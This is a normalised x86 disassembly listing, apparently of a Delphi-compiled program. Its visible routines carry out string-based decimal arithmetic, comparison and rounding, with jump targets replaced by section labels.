lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_46e11c
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46b724
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_46e2d8
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46b77c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46b7c5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_46e674
mov eax [ ebp - 0xc ]
call sub_4097e8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b7cc
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_46b7d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b815
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_46e674
mov eax [ ebp - 0x4 ]
call sub_408480
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b81c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_46b844
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_46bea4
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46b86c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46b8cc
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x28 ]
call sub_409788
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_46bea4
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b8d3
lea eax [ ebp - 0x28 ]
call sub_404008
retn
sub_46b8dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x28 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b936
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_408344
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_46bea4
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b93d
lea eax [ ebp - 0x28 ]
call sub_404008
retn
sub_46b970
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x22
call sub_402998
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46b9b8
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46ba58
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0xc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409788
mov eax [ ebp - 0x48 ]
lea edx [ ebp - 0x22 ]
call sub_46bea4
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov ecx esi
call sub_46dbc4
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403558
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_46b970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ba5f
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x4c ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x4c ]
call sub_46b678
sub_46ba5f
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46ba80
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46bb07
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x22 ]
mov eax esi
call sub_46bea4
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov cx [ ebp + 0xc ]
call sub_46dbc4
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403558
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_46b970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bb0e
lea eax [ ebp - 0x48 ]
call sub_404008
retn
lea edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x48 ]
call sub_46b678
sub_46bb0e
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46bb30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_46b970
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46bb7c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bca6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4152cc
xor eax eax
push ebp
push sub_46bc89
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4152dc
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415368
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4152cc
xor eax eax
push ebp
push sub_46bc5c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4152e8
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push 0x8
mov cx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b9b8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4152d4
retn
push 0x20
push 0x8
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415374
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ba80
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc90
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4152d4
retn
sub_46bcb4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46bdce
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414e58
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_46b768
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_404860
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41531c
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bdd5
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x18 ]
call sub_404714
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_46b768
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415310
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4152cc
xor eax eax
push ebp
push sub_46bd97
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x5
mov eax [ ebx + 0x8 ]
add eax 0x4
call sub_46bf00
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4152e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4152d4
retn
sub_46bde0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bb30
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_4152fc
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_4152dc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46be2c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46b6b8
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46b6ec
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46b6f8
jmp r-xdata
dec ebx
je r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46b724
jmp r-xdata
jmp r-xdata
call sub_4152a0
sub_46be84
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_46b750
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_46bea4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46bef2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d728
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bef9
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_46b5f0
sub_46bf00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46bf48
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46e674
mov eax [ ebp - 0xc ]
call sub_4097e8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf4f
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_46bf58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46c076
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041f0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40460c
mov edi eax
test di di
jne r-xdata
add si di
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40405c
cmp si di
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042c8
movsx edx si
cmp eax edx
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044c8
movsx edx si
dec edx
add eax edx
lea edx [ eax + 0x1 ]
cmp [ edx ] 0x35
jb r-xdata
test si si
jle r-xdata
mov dl [ eax ]
inc edx
mov [ eax ] dl
jmp r-xdata
cmp [ eax ] 0x39
jbe r-xdata
cmp [ eax ] 0x39
ja r-xdata
mov eax [ ebp - 0x8 ]
push eax
movsx ecx si
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404528
jmp r-xdata
mov [ eax ] 0x30
lea eax [ ebp - 0x10 ]
push eax
movsx ecx si
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404528
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404314
jmp r-xdata
cmp bl [ eax ]
je r-xdata
cmp bl [ eax ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c07d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
dec esi
dec eax
cmp bl [ eax ]
je r-xdata
mov [ eax ] 0x30
mov dl [ eax ]
inc edx
mov [ eax ] dl
sub_46c090
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_40405c
jmp r-xdata
mov eax [ ebx ]
call sub_4042c8
dec eax
jle r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
push ebx
mov eax [ ebx ]
call sub_4042c8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404528
sub_46c0cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
mov eax [ ebp - 0x8 ]
call sub_4044b8
xor eax eax
push ebp
push sub_46c172
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46c090
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4040a0
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
cmp ebx eax
jle r-xdata
mov ebx 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40806c
mov ebx eax
or ebx 0xffffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c179
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40402c
retn
sub_46c180
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4044b8
mov eax [ ebp - 0x8 ]
call sub_4044b8
xor eax eax
push ebp
push sub_46c318
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46c0cc
dec eax
jle r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_40405c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_40405c
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40405c
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_40405c
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
mov [ eax ] edi
jmp r-xdata
test esi esi
jle r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_4041f0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
call sub_40460c
mov esi eax
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_4041f0
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0x1c ]
mov edx [ edx ]
call sub_40460c
mov edi eax
test esi esi
jne r-xdata
test edi edi
jle r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx ebx
call sub_4041f0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
xor ecx ecx
call sub_40ce8c
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_40405c
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
sub eax esi
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
dec [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xffffff01
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c31f
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx ebx
call sub_4041f0
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
xor ecx ecx
call sub_40ce8c
mov edx [ ebp - 0x20 ]
mov eax [ ebp + 0x1c ]
call sub_40405c
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax edi
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
dec [ eax ]
sub_46c32c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x1 ] dl
mov esi [ ebp + 0x8 ]
mov ebx eax
sub bl 0x30
mov al [ ebp - 0x1 ]
sub al 0x30
add bl al
add bl [ edi ]
cmp bl 0x9
jbe r-xdata
mov eax esi
mov edx ebx
add dl 0x30
call sub_4041f0
mov [ edi ] 0x0
mov eax esi
mov edx ebx
sub dl 0xa
add dl 0x30
call sub_4041f0
mov [ edi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax esi
mov edx r-xdata
call sub_40405c
cmp [ esi ] 0x0
jne r-xdata
sub_46c398
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov edi [ ebp + 0x8 ]
mov dl [ ebp - 0x1 ]
sub dl 0x30
add dl [ esi ]
mov ebx eax
sub bl 0x30
sub bl dl
cmp bl 0x9
jbe r-xdata
mov eax edi
mov edx ebx
add dl 0x30
call sub_4041f0
mov [ esi ] 0x0
mov eax edi
mov edx ebx
add dl 0xa
add dl 0x30
call sub_4041f0
mov [ esi ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46c3e8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46c51f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40405c
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_404414
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c526
lea eax [ ebp - 0x8 ]
call sub_404008
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
mov edx ebx
call sub_40405c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov eax ebx
call sub_4044c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov [ ebp - 0x10 ] eax
mov eax ebx
call sub_4042c8
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_42b030
mov ebx eax
mov eax esi
call sub_404008
test ebx ebx
jle r-xdata
cmp [ ebp - 0x19 ] 0x0
jbe r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0x1
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404314
mov [ ebp - 0x1a ] 0x30
mov edx [ ebp - 0xc ]
mov al [ edx + eax ]
mov [ ebp - 0x1a ] al
jmp r-xdata
mov [ ebp - 0x1b ] 0x30
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov al [ eax + edx ]
mov [ ebp - 0x1b ] al
jmp r-xdata
cmp ebx [ ebp - 0x14 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x14 ]
sub edx ebx
mov [ ebp - 0x18 ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x19 ]
mov dl [ ebp - 0x1b ]
mov al [ ebp - 0x1a ]
call sub_46c32c
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404314
inc ebx
dec [ ebp - 0x20 ]
jne r-xdata
sub_46c548
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c726
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_46c0cc
test eax eax
jl r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4040a0
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_4040a0
mov eax esi
mov edx r-xdata
call sub_40405c
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040a0
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4040a0
mov eax esi
call sub_404008
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40405c
mov eax esi
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_404314
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404414
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40405c
jmp r-xdata
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4044c8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
call sub_4044c8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov edi eax
mov eax [ ebp - 0xc ]
call sub_4042c8
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_42b030
mov ebx eax
mov eax esi
call sub_404008
test ebx ebx
jle r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_40405c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c72d
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40402c
retn
cmp [ esi ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov ebx 0x1
mov eax esi
mov edx r-xdata
call sub_40405c
mov [ ebp - 0x1e ] 0x30
mov edx [ ebp - 0x10 ]
mov al [ edx + eax ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov [ ebp - 0x1f ] 0x30
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov al [ eax + edx ]
mov [ ebp - 0x1f ] al
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x18 ]
sub edx ebx
mov [ ebp - 0x1c ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1d ]
mov dl [ ebp - 0x1f ]
mov al [ ebp - 0x1e ]
call sub_46c398
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404314
inc ebx
dec [ ebp - 0x24 ]
jne r-xdata
sub_46c74c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c925
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_4042c8
push eax
mov eax esi
call sub_4042c8
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax ebx
call sub_46c180
mov eax [ ebp - 0x1c ]
call sub_4044c8
mov [ ebp - 0x14 ] eax
mov esi 0x1
xor edi edi
mov ebx [ ebp - 0x10 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax edi
xor edx edx
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_408430
cmp [ ebp - 0x8 ] 0xffffff01
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_408480
mov edx [ ebp - 0x14 ]
movzx edx [ edx + ebx ]
sub edx 0x30
imul edx
imul esi
add edi eax
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov esi eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c92c
lea eax [ ebp - 0x40 ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x24 ]
call sub_404008
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40402c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4042c8
mov ebx eax
sub ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov edx r-xdata
